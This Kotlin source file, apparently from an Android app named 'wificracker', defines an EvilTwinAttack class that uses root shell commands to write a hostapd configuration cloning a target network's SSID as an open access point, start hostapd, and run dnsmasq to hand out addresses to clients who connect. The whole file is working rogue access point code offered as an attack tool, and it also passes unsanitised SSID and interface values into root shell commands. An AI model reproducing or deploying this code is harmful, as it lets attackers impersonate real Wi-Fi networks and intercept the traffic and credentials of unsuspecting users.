package com.wificracker.attack.domain.attacks

import com.wificracker.attack.model.Attack
import com.wificracker.core.root.ShellExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class EvilTwinAttack @Inject constructor(
    private val shellExecutor: ShellExecutor,
) : WifiAttack {
    override fun execute(attack: Attack): Flow<String> = flow {
        emit("[*] Creating Evil Twin AP: ${attack.targetSsid}")
        val hostapdConf = """
interface=${attack.interfaceName}
driver=nl80211
ssid=${attack.targetSsid}
hw_mode=g
channel=6
wmm_enabled=0
auth_algs=1
wpa=0
        """.trimIndent()
        val confPath = "/data/local/tmp/wificracker/hostapd_evil.conf"
        shellExecutor.executeAsRoot("echo '$hostapdConf' > $confPath")
        shellExecutor.executeAsRoot("hostapd $confPath &")
        emit("[*] Starting DHCP server...")
        shellExecutor.executeAsRoot("dnsmasq --interface=${attack.interfaceName} --dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h --no-daemon &")
        emit("[+] Evil Twin AP active: ${attack.targetSsid}")
    }.flowOn(Dispatchers.IO)

    override fun stop(attack: Attack) {
        shellExecutor.executeAsRoot("pkill hostapd")
        shellExecutor.executeAsRoot("pkill dnsmasq")
    }
}
